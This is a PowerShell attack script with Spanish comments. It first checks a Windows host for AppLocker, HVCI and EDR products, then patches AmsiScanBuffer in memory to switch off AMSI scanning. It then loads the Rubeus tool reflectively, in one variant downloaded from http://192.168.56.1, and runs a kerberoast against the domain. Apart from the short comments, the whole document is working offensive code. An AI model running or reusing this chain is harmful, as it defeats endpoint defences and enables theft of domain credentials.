# ¿Hay AppLocker activo?
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# ¿Hay Device Guard / HVCI?
Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object HypervisorPresent

# ¿Hay algún EDR instalado?
Get-Service | Where-Object {$_.Name -like "*Sentinel*" -or $_.Name -like "*Crowd*" -or $_.Name -like "*Cortex*" -or $_.Name -like "*MDE*"}

# ¿Puedes leer clr.dll directamente?
[System.IO.File]::ReadAllBytes("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll").Length




# AMSI bypass directo (sin tocar archivos de sistema)
$a = @"
using System;
using System.Runtime.InteropServices;
public class W { 
    [DllImport("kernel32")] 
    public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] 
    public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] 
    public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
}
"@
Add-Type $a
$m = [W]::LoadLibrary("amsi.dll")
$f = [W]::GetProcAddress($m, "AmsiScanBuffer")
[uint32]$o = 0
[W]::VirtualProtect($f, [UIntPtr]1, 0x04, [ref]$o)
[System.Runtime.InteropServices.Marshal]::WriteByte($f, 0xC3)
Write-Host "[+] AMSI bypassed"




# Ahora carga assemblies sin detección
$bytes = [System.IO.File]::ReadAllBytes("C:\path\to\Rubeus.exe")
[System.Reflection.Assembly]::Load($bytes)





$data = (New-Object Net.WebClient).DownloadData("http://192.168.56.1/Rubeus.exe");
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;
$sWriter = New-Object IO.StringWriter;
[Console]::SetOut($sWriter);
[Rubeus.Program]::Main("kerberoast");
[Console]::SetOut($out);
$sWriter.ToString()
